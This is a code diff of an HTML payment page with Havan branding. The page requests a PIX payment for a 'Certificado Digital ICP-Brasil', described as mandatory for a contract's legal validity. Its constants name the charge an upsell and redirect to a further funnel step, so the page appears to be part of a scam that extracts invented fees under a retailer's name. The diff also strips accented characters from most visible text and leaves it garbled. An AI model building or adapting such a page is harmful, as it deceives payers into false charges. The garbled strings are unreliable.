@@ -31,7 +31,7 @@ body { font-family:'Montserrat',sans-serif; background:#f4f4f4; color:#333; marg
 <body class="min-h-screen pb-10">
 <div id="notification" class="notification-popup">
   <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-  <span>Código PIX copiado!</span>
+  <span>Cdigo PIX copiado!</span>
 </div>
 
 <header class="havan-header flex px-6 h-20 items-center justify-center">
@@ -50,7 +50,7 @@ body { font-family:'Montserrat',sans-serif; background:#f4f4f4; color:#333; marg
 
     <div class="px-6 py-8 text-center border-b border-gray-100">
       <h3 class="text-lg font-bold text-gray-800 mb-2" id="upsell-title">Certificado Digital ICP-Brasil</h3>
-      <p class="text-sm text-gray-500" id="upsell-desc">Assinatura digital obrigatória para validade jurídica do contrato.</p>
+      <p class="text-sm text-gray-500" id="upsell-desc">Assinatura digital obrigatria para validade jurdica do contrato.</p>
       <div class="text-3xl font-black text-havan-blue mt-4" id="display-amount">R$ 0,00</div>
     </div>
 
@@ -63,11 +63,11 @@ body { font-family:'Montserrat',sans-serif; background:#f4f4f4; color:#333; marg
       </div>
 
       <div class="mt-6">
-        <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Código PIX Copia e Cola</label>
+        <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Cdigo PIX Copia e Cola</label>
         <input id="codigo-input" type="text" readonly value="Carregando..." class="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 text-sm font-mono text-gray-600 focus:outline-none">
       </div>
 
-      <button onclick="copiarPixCode()" class="havan-button w-full mt-4 flex items-center justify-center gap-2">COPIAR CÓDIGO PIX</button>
+      <button onclick="copiarPixCode()" class="havan-button w-full mt-4 flex items-center justify-center gap-2">COPIAR CDIGO PIX</button>
     </div>
 
     <div class="px-6 py-6 bg-gray-50 text-center">
@@ -82,7 +82,7 @@ body { font-family:'Montserrat',sans-serif; background:#f4f4f4; color:#333; marg
       <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
     </div>
     <h1 class="text-2xl font-black text-havan-blue mb-2">PAGAMENTO APROVADO!</h1>
-    <p class="text-gray-600 mb-8">Seu pagamento foi processado com sucesso. Você será redirecionado...</p>
+    <p class="text-gray-600 mb-8">Seu pagamento foi processado com sucesso. Voc ser redirecionado...</p>
   </div>
 </div>
 
@@ -93,7 +93,7 @@ const REDIRECT_URL = '/funil/pos/up3/';
 const AMOUNT = 1956;
 const PRODUCT = 'upsell-2';
 const TITLE = 'Certificado Digital ICP-Brasil';
-const DESC = 'Assinatura digital obrigatÃ³ria para validade jurÃ­dica do contrato.';
+const DESC = 'Assinatura digital obrigatória para validade jurídica do contrato.';
 
 let pixCode = null;
 let transactionId = null;
